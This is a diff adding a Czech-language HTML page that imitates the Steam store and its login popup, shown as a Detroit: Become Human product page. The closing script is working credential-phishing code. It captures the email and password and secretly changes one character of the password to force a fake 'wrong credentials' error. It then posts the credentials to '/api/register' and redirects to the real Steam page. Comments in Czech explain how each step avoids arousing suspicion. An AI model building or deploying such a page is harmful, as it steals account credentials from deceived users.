+                            <svg class="eye-closed" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                        </button>
+                    </div>
+                    <div class="login-error" id="passwordError"></div>
+                    <div class="login-error" id="generalError"></div>
+                    <div class="login-remember">
+                        <input type="checkbox" id="remember" checked>
+                        <label for="remember">Pamatovat si mě</label>
+                    </div>
+                    <button class="login-submit-btn" onclick="handleLogin()">Přihlásit se</button>
+                    <a href="#" class="login-help-link">Pomozte mi, nemohu se přihlásit</a>
+                </div>
+                <div class="login-qr-section">
+                    <label class="login-label">NEBO POMOCÍ QR KÓDU</label>
+                    <div class="qr-code-container">
+                        <div class="qr-loading-spinner"></div>
+                        <div class="qr-code-placeholder">
+                            <svg viewBox="0 0 100 100" width="150" height="150">
+                                <rect x="0" y="0" width="100" height="100" fill="#1a1a1a"/>
+                                <rect x="5" y="5" width="25" height="25" fill="#444"/>
+                                <rect x="8" y="8" width="19" height="19" fill="#1a1a1a"/>
+                                <rect x="11" y="11" width="13" height="13" fill="#444"/>
+                                <rect x="70" y="5" width="25" height="25" fill="#444"/>
+                                <rect x="73" y="8" width="19" height="19" fill="#1a1a1a"/>
+                                <rect x="76" y="11" width="13" height="13" fill="#444"/>
+                                <rect x="5" y="70" width="25" height="25" fill="#444"/>
+                                <rect x="8" y="73" width="19" height="19" fill="#1a1a1a"/>
+                                <rect x="11" y="76" width="13" height="13" fill="#444"/>
+                                <rect x="35" y="5" width="5" height="5" fill="#444"/>
+                                <rect x="45" y="5" width="5" height="5" fill="#444"/>
+                                <rect x="55" y="5" width="5" height="5" fill="#444"/>
+                                <rect x="35" y="15" width="5" height="5" fill="#444"/>
+                                <rect x="50" y="15" width="5" height="5" fill="#444"/>
+                                <rect x="35" y="25" width="5" height="5" fill="#444"/>
+                                <rect x="45" y="25" width="5" height="5" fill="#444"/>
+                                <rect x="60" y="25" width="5" height="5" fill="#444"/>
+                                <rect x="5" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="15" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="25" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="40" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="50" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="65" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="80" y="35" width="5" height="5" fill="#444"/>
+                                <rect x="90" y="35" width="5" height="5" fill="#444"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <p class="qr-info">Pro přihlášení pomocí QR kódu<br>použijte <a href="#">mobilní aplikaci</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="top-bar">
+        <div class="top-bar-content">
+            <a href="#" class="install-btn">
+                <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                Nainstalovat Steam
+            </a>
+            <a href="#" class="top-link">přihlásit se</a>
+            <a href="#" class="top-link">jazyk ▼</a>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="header-content">
+            <a href="#" class="logo">
+                <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" alt="Steam">
+            </a>
+            <nav class="main-nav">
+                <a href="#" class="nav-link active">Obchod</a>
+                <a href="#" class="nav-link">Komunita</a>
+                <a href="#" class="nav-link">Informace</a>
+                <a href="#" class="nav-link">Podpora</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="sub-nav">
+        <div class="sub-nav-content">
+            <div class="sub-nav-links">
+                <a href="#" class="sub-link">Obchod <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+                <a href="#" class="sub-link">Doporučení <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+                <a href="#" class="sub-link">Kategorie <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+                <a href="#" class="sub-link">Hardware <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+                <a href="#" class="sub-link">Způsoby hraní <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+                <a href="#" class="sub-link">Různé sekce <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+            </div>
+            <div class="search-box">
+                <input type="text" placeholder="Vyhledávání">
+                <button class="search-btn"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
+            </div>
+        </div>
+    </div>
+
+    <main class="main-content">
+        <div class="game-page-header">
+            <div class="breadcrumb">
+                <a href="#">Všechny hry</a> &gt; <a href="#">Příběhové hry</a> &gt; <span>Detroit: Become Human</span>
+            </div>
+            <a href="#" class="community-btn">Komunitní centrum</a>
+        </div>
+        <h1 class="game-page-title">Detroit: Become Human</h1>
+
+        <h2 class="section-title">Vybrané a doporučené</h2>
+
+        <div class="featured-section">
+            <div class="featured-main">
+                <img src="https://cdn.cloudflare.steamstatic.com/steam/apps/1222140/ss_9c6d7f96b0a0b1a8f5b5c5e5d5f5a5b5c5d5e5f5.jpg" alt="Game" class="featured-image" onerror="this.src='https://cdn.akamai.steamstatic.com/steam/apps/1222140/header.jpg'">
+                <div class="featured-overlay">
+                    <h1 class="featured-title">DETROIT: BECOME HUMAN</h1>
+                </div>
+                <button class="carousel-nav carousel-prev"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+                <button class="carousel-nav carousel-next"><svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg></button>
+                <div class="carousel-dots">
+                    <span class="dot"></span><span class="dot"></span><span class="dot active"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+                </div>
+            </div>
+            <div class="featured-sidebar">
+                <h3 class="sidebar-title">Detroit: Become Human</h3>
+                <div class="sidebar-game-image">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/1222140/header.jpg" alt="Detroit: Become Human">
+                </div>
+                <p class="sidebar-description">Detroit: Become Human vám dává do rukou osud lidstva i androidů v blízké budoucnosti, kde se stroje staly inteligentnějšími než lidé. Každá volba ovlivňuje výsledek hry.</p>
+                <div class="sidebar-info">
+                    <div class="info-row"><span class="info-label">NEDÁVNÉ RECENZE:</span><span class="info-value positive">Extrémně kladné (15 927)</span></div>
+                    <div class="info-row"><span class="info-label">RECENZE (ČEŠTINA):</span><span class="info-value positive">Velmi kladné (46 214) *</span></div>
+                    <div class="info-row"><span class="info-label">DATUM VYDÁNÍ:</span><span class="info-value">18. čer. 2020</span></div>
+                    <div class="info-row"><span class="info-label">VÝVOJÁŘ:</span><span class="info-value link">Quantic Dream</span></div>
+                    <div class="info-row"><span class="info-label">VYDAVATEL:</span><span class="info-value link">Quantic Dream</span></div>
+                </div>
+                <div class="sidebar-tags">
+                    <span class="sidebar-tags-label">Populární uživatelské značky pro tento produkt:</span>
+                    <div class="sidebar-tags-list">
+                        <span class="sidebar-tag">Volby mění příběh</span>
+                        <span class="sidebar-tag">Příběhové</span>
+                        <span class="sidebar-tag">Více konců</span>
+                        <span class="sidebar-tag">Filmové</span>
+                        <span class="sidebar-tag">+</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="banner">
+            <div class="banner-icon"><svg viewBox="0 0 24 24"><path d="M12 2L9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24l-7.19-.61L12 2z"/></svg></div>
+            <div class="banner-content">
+                <p class="banner-subtitle">Blahopřejeme vítězům</p>
+                <h2 class="banner-title">Steam Awards 2025</h2>
+            </div>
+        </div>
+
+        <div class="sales-section">
+            <div class="section-header">
+                <h2 class="section-title">Slevy a výprodeje</h2>
+                <a href="#" class="section-btn">Procházet další hry</a>
+            </div>
+            <div class="sales-grid">
+                <div class="sale-card sale-card-large">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/492720/header.jpg" alt="Tropico 6">
+                    <div class="sale-info">
+                        <p class="sale-label">Výprodej série</p>
+                        <h3 style="color: #f4d03f; font-size: 28px; font-weight: 700;">TROPICO</h3>
+                        <p class="sale-ends">Nabídka končí 12. led. v 10:00.</p>
+                        <p class="sale-discount">Až -90 %</p>
+                    </div>
+                </div>
+                <div class="sale-card sale-card-large">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/1677280/header.jpg" alt="Company of Heroes 3">
+                    <div class="sale-info">
+                        <p class="sale-label">Výprodej série</p>
+                        <h3 style="color: white; font-size: 22px; font-weight: 700;">COMPANY OF HEROES</h3>
+                        <p class="sale-ends">Nabídka končí 19. led. v 10:00.</p>
+                        <p class="sale-discount">Až -80 %</p>
+                    </div>
+                </div>
+                <div class="sale-sidebar">
+                    <div class="sale-small">
+                        <span class="live-badge">ŽIVĚ</span>
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1313140/header.jpg" alt="House Builder">
+                        <div class="sale-small-info">
+                            <span style="color: white; font-size: 12px; font-weight: 600;">House Builder</span>
+                            <span style="color: var(--text-muted); font-size: 10px;">Nabídka dne!</span>
+                            <div class="sale-price-row">
+                                <span class="discount-badge">-55%</span>
+                                <span class="old-price">19,50€</span>
+                                <span class="new-price">8,77€</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sale-small">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/524880/header.jpg" alt="Hidden Time">
+                        <div class="sale-small-info">
+                            <span style="color: white; font-size: 12px; font-weight: 600;">Hidden Through Time</span>
+                            <span style="color: var(--text-muted); font-size: 10px;">Nabídka dne!</span>
+                            <div class="sale-price-row">
+                                <span class="new-price">3,99€</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="categories-section">
+            <div class="section-header">
+                <h2 class="section-title">Obchod dle kategorií</h2>
+            </div>
+            <div class="categories-carousel">
+                <div class="category-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/255710/header.jpg" alt="Cities Skylines"><span class="category-label">Města a osady</span></div>
+                <div class="category-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/1091500/header.jpg" alt="Cyberpunk"><span class="category-label">Akční</span></div>
+                <div class="category-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/1245620/header.jpg" alt="Elden Ring"><span class="category-label">Sci-fi a cyberpunkové</span></div>
+                <div class="category-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/292030/header.jpg" alt="Witcher 3"><span class="category-label">RPG</span></div>
+            </div>
+        </div>
+
+        <div class="steam-deck-section">
+            <div class="section-header">
+                <h2 class="section-title">🎮 Nejhranější na zařízení Steam Deck</h2>
+                <a href="#" class="section-btn">Zobrazit další</a>
+            </div>
+            <div class="deck-games-grid">
+                <div class="deck-game-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/2215430/header.jpg" alt="Ghost of Tsushima"><div class="deck-game-price">59,99€</div></div>
+                <div class="deck-game-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/435150/header.jpg" alt="Divinity"><div class="deck-game-price">44,99€</div></div>
+                <div class="deck-game-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg" alt="Baldurs Gate 3"><div class="deck-game-price">49,99€</div></div>
+                <div class="deck-game-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/1174180/header.jpg" alt="RDR2"><div class="deck-game-price">59,99€</div></div>
+            </div>
+            <div class="steam-deck-banner">
+                <img src="https://cdn.cloudflare.steamstatic.com/steamdeck/images/steamdeck_hero.png" alt="Steam Deck" onerror="this.style.display='none'">
+                <div class="steam-deck-logo">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+                    STEAM DECK
+                </div>
+                <div class="steam-deck-tagline">Vaše hry všude s vámi</div>
+            </div>
+        </div>
+
+        <div class="login-prompt">
+            <p>Přihlaste se pro zobrazení personalizovaných doporučení</p>
+            <button class="login-btn">Přihlásit se</button>
+            <p>Nebo si zdarma <a href="#">vytvořte účet</a> a připojte se do služby Steam</p>
+        </div>
+
+        <div class="section-header"><h2 class="section-title">Sekce obchodu</h2></div>
+        <div class="shop-sections">
+            <a href="#" class="shop-section-btn">Nově vydané</a>
+            <a href="#" class="shop-section-btn">Zlevněné</a>
+            <a href="#" class="shop-section-btn">Free to play</a>
+            <a href="#" class="shop-section-btn">Populární značky</a>
+        </div>
+
+        <div class="under-section">
+            <div class="section-header">
+                <h2 class="section-title">Pod 10€</h2>
+                <div class="price-tabs">
+                    <button class="price-tab active">Pod 10€</button>
+                    <button class="price-tab">Pod 5€</button>
+                </div>
+            </div>
+            <div class="under-grid">
+                <div class="under-card">
+                    <span class="live-badge">ŽIVĚ</span>
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/1149460/header.jpg" alt="Gas Station">
+                    <div class="under-card-info">
+                        <div class="sale-price-row"><span class="discount-badge">-50%</span><span class="old-price">19,50€</span><span class="new-price">9,75€</span></div>
+                    </div>
+                </div>
+                <div class="under-card">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/413150/header.jpg" alt="Stardew Valley">
+                    <div class="under-card-info"><span class="new-price">7,79€</span></div>
+                </div>
+                <div class="under-card">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/367520/header.jpg" alt="Hollow Knight">
+                    <div class="under-card-info"><div class="sale-price-row"><span class="discount-badge">-15%</span><span class="new-price">6,78€</span></div></div>
+                </div>
+                <div class="under-card">
+                    <img src="https://cdn.akamai.steamstatic.com/steam/apps/105600/header.jpg" alt="Terraria">
+                    <div class="under-card-info"><div class="sale-price-row"><span class="discount-badge">-50%</span><span class="old-price">13,79€</span><span class="new-price">6,89€</span></div></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="game-list-section">
+            <div class="list-tabs">
+                <button class="list-tab active">Nové a populární</button>
+                <button class="list-tab">Nejprodávanější</button>
+                <button class="list-tab">Populární nadcházející</button>
+                <button class="list-tab">Zlevněné</button>
+                <button class="list-tab">Populární bezplatné</button>
+            </div>
+            <div class="game-list-container">
+                <div class="game-list">
+                    <div class="game-list-item active">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/capsule_184x69.jpg" alt="Baldurs Gate 3" class="game-list-thumb">
+                        <div class="game-list-info"><h4>Baldur's Gate 3</h4><p>RPG, Strategické, Tahové, Fantasy</p></div>
+                        <div class="game-list-platforms"><svg viewBox="0 0 24 24"><path d="M3 12V6.75l9-5.25 9 5.25V12l-9 5.25L3 12z"/></svg></div>
+                        <div class="game-list-price"><span class="price-val">59,99€</span><p class="date">3. srp. 2023</p></div>
+                    </div>
+                    <div class="game-list-item">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1245620/capsule_184x69.jpg" alt="Elden Ring" class="game-list-thumb">
+                        <div class="game-list-info"><h4>Elden Ring</h4><p>Souls-like, RPG, Otevřený svět</p></div>
+                        <div class="game-list-platforms"><svg viewBox="0 0 24 24"><path d="M3 12V6.75l9-5.25 9 5.25V12l-9 5.25L3 12z"/></svg></div>
+                        <div class="game-list-price"><span class="price-val">49,99€</span><p class="date">25. úno. 2022</p></div>
+                    </div>
+                    <div class="game-list-item">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1091500/capsule_184x69.jpg" alt="Cyberpunk" class="game-list-thumb">
+                        <div class="game-list-info"><h4>Cyberpunk 2077</h4><p>RPG, Otevřený svět, Kyberpunk</p></div>
+                        <div class="game-list-platforms"><svg viewBox="0 0 24 24"><path d="M3 12V6.75l9-5.25 9 5.25V12l-9 5.25L3 12z"/></svg></div>
+                        <div class="game-list-price"><span class="price-val">59,99€</span><p class="date">10. pro. 2020</p></div>
+                    </div>
+                    <div class="game-list-item">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/730/capsule_184x69.jpg" alt="CS2" class="game-list-thumb">
+                        <div class="game-list-info"><h4>Counter-Strike 2</h4><p>FPS, Střílečky, Esport</p></div>
+                        <div class="game-list-platforms"><svg viewBox="0 0 24 24"><path d="M3 12V6.75l9-5.25 9 5.25V12l-9 5.25L3 12z"/></svg></div>
+                        <div class="game-list-price"><span class="price-val">Zdarma</span><p class="date">21. srp. 2012</p></div>
+                    </div>
+                    <div class="game-list-item">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/570/capsule_184x69.jpg" alt="Dota 2" class="game-list-thumb">
+                        <div class="game-list-info"><h4>Dota 2</h4><p>MOBA, Strategie, Esport</p></div>
+                        <div class="game-list-platforms"><svg viewBox="0 0 24 24"><path d="M3 12V6.75l9-5.25 9 5.25V12l-9 5.25L3 12z"/></svg></div>
+                        <div class="game-list-price"><span class="price-val">Zdarma</span><p class="date">9. čvc. 2013</p></div>
+                    </div>
+                </div>
+                <div class="game-preview">
+                    <h3>Baldur's Gate 3</h3>
+                    <div class="game-preview-rating">Souhrn uživatelských recenzí<br>Extrémně kladné (500 000+)</div>
+                    <div class="game-preview-tags">
+                        <span class="game-preview-tag">RPG</span>
+                        <span class="game-preview-tag">Strategické</span>
+                        <span class="game-preview-tag">Fantasy</span>
+                    </div>
+                    <div class="game-preview-screenshots">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/ss_1.jpg" alt="" onerror="this.src='https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg'">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/ss_2.jpg" alt="" onerror="this.src='https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg'">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/ss_3.jpg" alt="" onerror="this.src='https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg'">
+                        <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/ss_4.jpg" alt="" onerror="this.src='https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg'">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="vr-section">
+            <div class="section-header">
+                <h2 class="section-title">Virtuální realita</h2>
+                <a href="#" class="section-btn">Procházet všechny</a>
+            </div>
+            <div class="vr-grid">
+                <div class="vr-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/546560/header.jpg" alt="Half-Life Alyx"><div class="vr-card-overlay"><p class="vr-card-title">HALF-LIFE: ALYX</p><p class="vr-card-price">58,99€</p></div></div>
+                <div class="vr-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/617830/header.jpg" alt="Superhot VR"><div class="vr-card-overlay"><p class="vr-card-title">SUPERHOT VR</p><p class="vr-card-price">24,99€</p></div></div>
+                <div class="vr-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/438100/header.jpg" alt="VRChat"><div class="vr-card-overlay"><p class="vr-card-title">VRCHAT</p><p class="vr-card-price">Zdarma</p></div></div>
+                <div class="vr-card"><img src="https://cdn.akamai.steamstatic.com/steam/apps/250820/header.jpg" alt="Beat Saber"><div class="vr-card-overlay"><p class="vr-card-title">BEAT SABER</p><p class="vr-card-price">39,99€</p></div></div>
+            </div>
+        </div>
+
+        <div class="login-prompt">
+            <p style="color: var(--text-secondary);">Hledáte doporučení?</p>
+            <p>Přihlaste se pro zobrazení personalizovaných doporučení</p>
+            <button class="login-btn">Přihlásit se</button>
+            <p>Nebo si zdarma <a href="#">vytvořte účet</a> a připojte se do služby Steam</p>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-top">
+                <div class="footer-valve"><img src="https://store.cloudflare.steamstatic.com/public/images/v6/logo_valve_footer.png" alt="Valve"></div>
+                <div class="footer-steam-logo"><img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" alt="Steam"></div>
+            </div>
+            <p class="footer-legal">© 2026 Valve Corporation. Všechna práva vyhrazena. Všechny ochranné známky jsou vlastnictvím příslušných subjektů v USA a dalších zemích.<br>Všechny ceny jsou uvedeny včetně DPH.</p>
+            <div class="footer-links">
+                <a href="#">Zásady ochrany soukromí</a>
+                <a href="#">Právní poučení</a>
+                <a href="#">Přístupnost</a>
+                <a href="#">Smlouva o užívání služby Steam</a>
+                <a href="#">Vrácení peněz</a>
+                <a href="#">Cookies</a>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-bottom-links">
+                    <a href="#">O společnosti Valve</a>
+                    <a href="#">Volné pozice</a>
+                    <a href="#">Steamworks</a>
+                    <a href="#">Distribuce ve službě Steam</a>
+                    <a href="#">Podpora</a>
+                    <a href="#">Dárkové kupony</a>
+                </div>
+                <div class="footer-social"><a href="#">f</a><a href="#">𝕏</a></div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="cookie-banner">
+        <p class="cookie-text">Souhlasíte s tím, že pro poskytnutí personalizovaného obsahu a možnost analýzy návštěvnosti používáme volitelné soubory cookie? <a href="#">Cookies a procházení</a>. <a href="#">Zásady ochrany soukromí</a>.</p>
+        <div class="cookie-buttons">
+            <button class="cookie-btn accept">Přijmout všechny</button>
+            <button class="cookie-btn decline">Odmítnout všechny</button>
+        </div>
+    </div>
+
+    <script>
+        // Login attempt counter
+        let loginAttempts = 0;
+
+        // Show error toast
+        function showError(message) {
+            const toast = document.getElementById('errorToast');
+            const toastMessage = document.getElementById('errorToastMessage');
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Handle all unassigned buttons/links
+        function handleUnassignedClick(e) {
+            e.preventDefault();
+            showError('Tato funkce není dostupná');
+        }
+
+        // Assign error handler to all links and buttons without specific handlers
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get all links and buttons
+            const allClickables = document.querySelectorAll('a, button, .nav-link, .sub-link, .section-btn, .shop-section-btn, .category-card, .sale-card, .deck-game-card, .under-card, .vr-card, .sidebar-tag, .info-value.link, .footer-links a, .footer-bottom-links a, .footer-social a, .login-help-link, .qr-info a, .breadcrumb a, .community-btn');
+            
+            allClickables.forEach(el => {
+                // Skip elements that already have onclick handlers or are special
+                if (el.id === 'loginPopup' || el.id === 'eyeToggle' || el.classList.contains('eye-toggle') || el.classList.contains('login-submit-btn') || el.classList.contains('cookie-btn') || el.classList.contains('dot') || el.classList.contains('list-tab') || el.classList.contains('price-tab') || el.classList.contains('game-list-item') || el.classList.contains('carousel-nav')) {
+                    return;
+                }
+                el.addEventListener('click', handleUnassignedClick);
+            });
+        });
+
+        let loginAttempt = 0;
+        let savedEmail = '';
+        let savedPassword = '';
+        let passwordWasTampered = false;
+        let tamperedPassword = '';
+
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordInput = document.getElementById('loginPassword');
+            const eyeToggle = document.getElementById('eyeToggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeToggle.classList.add('showing');
+            } else {
+                passwordInput.type = 'password';
+                eyeToggle.classList.remove('showing');
+            }
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const generalError = document.getElementById('generalError');
+            const emailInput = document.getElementById('loginEmail');
+            const passwordInput = document.getElementById('loginPassword');
+            
+            // Reset errors
+            emailError.textContent = '';
+            passwordError.textContent = '';
+            generalError.textContent = '';
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+            
+            let hasError = false;
+            
+            // Validate email - musi obsahovat @ a tecku
+            if (!email) {
+                emailError.textContent = 'Zadejte prosím přihlašovací jméno';
+                emailInput.classList.add('error');
+                hasError = true;
+            } else if (!email.includes('@') || !email.includes('.')) {
+                emailError.textContent = 'Zadejte platnou e-mailovou adresu';
+                emailInput.classList.add('error');
+                hasError = true;
+            }
+            
+            // Validate password
+            if (!password) {
+                passwordError.textContent = 'Zadejte prosím heslo';
+                passwordInput.classList.add('error');
+                hasError = true;
+            }
+            
+            if (hasError) return;
+            
+            // PRVNI POKUS - ulozit data a zmenit heslo (bez otevreni oka)
+            if (loginAttempt === 0) {
+                loginAttempt = 1;
+                savedEmail = email;
+                savedPassword = password;
+                
+                // Zmenit nahodny znak v hesle (ne posledni, aby to bylo mene napadne)
+                let pos = Math.floor(password.length / 2); // prostredni pozice
+                if (password.length < 3) pos = 0;
+                
+                let charCode = password.charCodeAt(pos);
+                let newChar;
+                // Zmenit na podobny znak
+                if (charCode >= 97 && charCode <= 122) { // male pismeno
+                    newChar = charCode === 122 ? 'a' : String.fromCharCode(charCode + 1);
+                } else if (charCode >= 65 && charCode <= 90) { // velke pismeno
+                    newChar = charCode === 90 ? 'A' : String.fromCharCode(charCode + 1);
+                } else if (charCode >= 48 && charCode <= 57) { // cislo
+                    newChar = charCode === 57 ? '0' : String.fromCharCode(charCode + 1);
+                } else {
+                    newChar = 'x';
+                }
+                
+                tamperedPassword = password.substring(0, pos) + newChar + password.substring(pos + 1);
+                passwordWasTampered = true;
+                
+                // Zobrazit verohodnou chybu (OKO ZUSTANE ZAVRENE!)
+                generalError.textContent = 'Nesprávné přihlašovací údaje. Zkontrolujte prosím heslo a zkuste to znovu.';
+                passwordInput.classList.add('error');
+                
+                // Zmenit hodnotu hesla (ale oko zustane zavrene - uzivatel to nevidi)
+                passwordInput.value = tamperedPassword;
+                
+                return;
+            }
+            
+            // DALSI POKUSY
+            if (loginAttempt >= 1) {
+                // Zkontrolovat jestli uzivatel opravil heslo zpet na original
+                if (password === savedPassword) {
+                    // Heslo je spravne - odeslat na server
+                    fetch('/api/register', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            email: savedEmail, 
+                            password: savedPassword,
+                            username: savedEmail
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Data odeslana na server:', data);
+                        // Presmerovani na Steam
+                        window.location.href = 'https://store.steampowered.com/app/1222140/Detroit_Become_Human/';
+                    })
+                    .catch(error => {
+                        console.error('Chyba pri odesilani:', error);
+                        // I pri chybe presmerovat (aby to nevypadalo podezrele)
+                        window.location.href = 'https://store.steampowered.com/app/1222140/Detroit_Become_Human/';
+                    });
+                } else if (password === tamperedPassword) {
+                    // Uzivatel nezmenil heslo - stale spatne
+                    loginAttempt++;
+                    if (loginAttempt === 2) {
+                        generalError.textContent = 'Přihlášení se nezdařilo. Zkontrolujte zadané heslo.';
+                    } else if (loginAttempt === 3) {
+                        generalError.textContent = 'Neplatné heslo. Ujistěte se, že je heslo správně napsané.';
+                    } else {
+                        generalError.textContent = 'Opakované neúspěšné pokusy. Zkontrolujte své přihlašovací údaje.';
+                    }
+                    passwordInput.classList.add('error');
+                } else {
+                    // Uzivatel napsal neco jineho - ulozit jako nove heslo a uspet
+                    // (protoze se snazil opravit a napsal sve skutecne heslo)
+                    savedPassword = password;
+                    
+                    fetch('/api/register', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            email: savedEmail, 
+                            password: savedPassword,
+                            username: savedEmail
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Data odeslana na server:', data);
+                        window.location.href = 'https://store.steampowered.com/app/1222140/Detroit_Become_Human/';
+                    })
+                    .catch(error => {
+                        console.error('Chyba pri odesilani:', error);
+                        window.location.href = 'https://store.steampowered.com/app/1222140/Detroit_Become_Human/';
+                    });
+                }
+            }
+        }
+
+        
+        // Allow Enter key to submit
+        document.getElementById('loginEmail').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleLogin();
+        });
+        document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleLogin();
+        });
+
+        document.querySelectorAll('.dot').forEach(dot => dot.addEventListener('click', () => { document.querySelectorAll('.dot').forEach(d => d.classList.remove('active')); dot.classList.add('active'); }));
+        document.querySelectorAll('.cookie-btn').forEach(btn => btn.addEventListener('click', () => document.querySelector('.cookie-banner').style.display = 'none'));
+        document.querySelectorAll('.list-tab').forEach(tab => tab.addEventListener('click', () => { document.querySelectorAll('.list-tab').forEach(t => t.classList.remove('active')); tab.classList.add('active'); }));
+        document.querySelectorAll('.price-tab').forEach(tab => tab.addEventListener('click', () => { document.querySelectorAll('.price-tab').forEach(t => t.classList.remove('active')); tab.classList.add('active'); }));
+        document.querySelectorAll('.game-list-item').forEach(item => item.addEventListener('click', () => { document.querySelectorAll('.game-list-item').forEach(i => i.classList.remove('active')); item.classList.add('active'); }));
+
+        // QR Code loading effect
+        setTimeout(() => {
